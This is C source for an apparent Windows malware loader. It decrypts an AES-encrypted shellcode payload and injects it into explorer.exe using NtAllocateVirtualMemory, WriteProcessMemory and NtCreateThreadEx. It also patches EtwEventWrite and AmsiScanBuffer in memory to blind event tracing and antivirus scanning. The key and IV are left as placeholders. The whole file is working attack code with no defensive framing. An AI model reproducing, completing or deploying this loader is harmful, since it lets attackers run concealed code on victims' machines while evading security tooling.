#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <tlhelp32.h>
#include "aes.h"
#include "payload.h" // contains: encryptedPayload[], encryptedPayloadLen

// AES Key/IV
uint8_t key[32] = {
//Your key
};
uint8_t iv[16] = {
//your key
};

// Patch ETW
void PatchETW() {
    void* p = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    if (!p) return;
    DWORD old;
    VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)p = 0xC3;
    VirtualProtect(p, 1, old, &old);
}

// Patch AMSI
void PatchAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    void* addr = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!addr) return;
    DWORD old;
    VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &old);
    BYTE patch[] = {0x31, 0xC0, 0xC3}; // xor eax,eax; ret
    memcpy(addr, patch, sizeof(patch));
    VirtualProtect(addr, 6, old, &old);
}

// Find process by name
DWORD FindProcessId(const char *procName) {
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

// PKCS#7 padding removal
size_t RemovePKCS7Padding(uint8_t *data, size_t length) {
    if (length == 0) return 0;
    uint8_t pad_len = data[length - 1];
    if (pad_len == 0 || pad_len > 16) return 0;
    for (size_t i = 1; i <= pad_len; i++) {
        if (data[length - i] != pad_len) return 0;
    }
    return length - pad_len;
}

int main() {
    const char *targetProc = "explorer.exe";
    DWORD pid = FindProcessId(targetProc);
    if (!pid) return -1;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return -2;

    struct AES_ctx ctx;
    uint8_t *decrypted = (uint8_t*)VirtualAlloc(NULL, encryptedPayloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted) {
        CloseHandle(hProc);
        return -3;
    }

    memcpy(decrypted, encryptedPayload, encryptedPayloadLen);
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, decrypted, encryptedPayloadLen);

    size_t shellcode_len = RemovePKCS7Padding(decrypted, encryptedPayloadLen);
    if (shellcode_len == 0) {
        VirtualFree(decrypted, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -4;
    }

    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcode_len;

    typedef NTSTATUS (NTAPI *NtAlloc)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    typedef NTSTATUS (NTAPI *NtCreateThreadEx)(
        PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID,
        PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

    NtAlloc NtAllocateVirtualMemory = (NtAlloc)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    NtCreateThreadEx NtCreateThread = (NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (!NtAllocateVirtualMemory || !NtCreateThread) {
        VirtualFree(decrypted, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -5;
    }

    NTSTATUS status = NtAllocateVirtualMemory(hProc, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0 || baseAddress == NULL) {
        VirtualFree(decrypted, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -6;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProc, baseAddress, decrypted, shellcode_len, &bytesWritten) || bytesWritten != shellcode_len) {
        VirtualFree(decrypted, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -7;
    }

    HANDLE hThread = NULL;
    status = NtCreateThread(&hThread, THREAD_ALL_ACCESS, NULL, hProc, baseAddress, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0 || hThread == NULL) {
        VirtualFree(decrypted, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -8;
    }

    PatchETW();
    PatchAMSI();

    WaitForSingleObject(hThread, 15000);

    VirtualFree(decrypted, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
